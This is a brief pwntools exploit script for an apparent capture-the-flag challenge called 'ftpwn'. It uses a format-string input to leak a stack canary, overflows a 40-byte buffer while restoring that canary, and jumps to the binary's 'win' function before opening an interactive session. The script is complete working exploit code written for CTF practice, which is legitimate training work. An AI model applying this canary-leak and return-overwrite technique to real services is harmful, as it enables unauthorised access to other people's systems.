from pwn import *

elf = ELF("./ftpwn")

# context.log_level = "debug"
# io = remote("tamuctf.com", 443, ssl=True, sni="ftpwn")
io = remote("localhost", 1337)
# io = gdb.debug(elf.path, '''
#     b * main+582
#     c
# ''')

io.sendline(b'ls')
io.sendline(b'%15$p') # first stack is at 7$p, canary is 8 away

io.recvuntil(b'0x')
leak = int(io.recvuntil(b'\n', drop=True), 16)
log.info(f"leak: {hex(leak)}")

io.sendline(b'download')
payload = b'A' * 40 # buffer is 40 bytes
payload += p64(leak) # stack canary
payload += p64(1)  
payload += p64(elf.symbols['win']) 
io.sendline(payload)

io.sendline(b'exit')

io.interactive(prompt="") 
